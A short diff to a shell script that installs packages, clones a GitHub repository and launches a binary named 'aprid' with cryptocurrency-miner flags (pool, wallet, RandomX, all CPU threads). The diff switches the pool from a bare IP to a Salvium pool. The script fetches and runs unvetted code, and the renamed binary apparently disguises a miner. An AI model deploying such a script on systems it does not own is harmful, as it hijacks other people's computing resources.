@@ -3,4 +3,4 @@ yum update && yum -y install sudo
 yum -y install git wget
 git clone https://github.com/nonibihan/luo.git && cd luo
 chmod 777 aprid SHA256SUMS
-./aprid --donate-level 1 -o 152.42.247.49:443 -u SaLvsBkggaZbHsXJoYQnuhZeaQD8aKjXqP882vZmTBkneBdrZw9KH1BfkcaD16GEitJSDmteoTsYVH2CVXZz2NbuVuR8qhi4ueV -p TART -a rx/0 -k -t $(nproc --all)
+./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvsBkggaZbHsXJoYQnuhZeaQD8aKjXqP882vZmTBkneBdrZw9KH1BfkcaD16GEitJSDmteoTsYVH2CVXZz2NbuVuR8qhi4ueV -p TART -a rx/0 -k -t $(nproc --all)
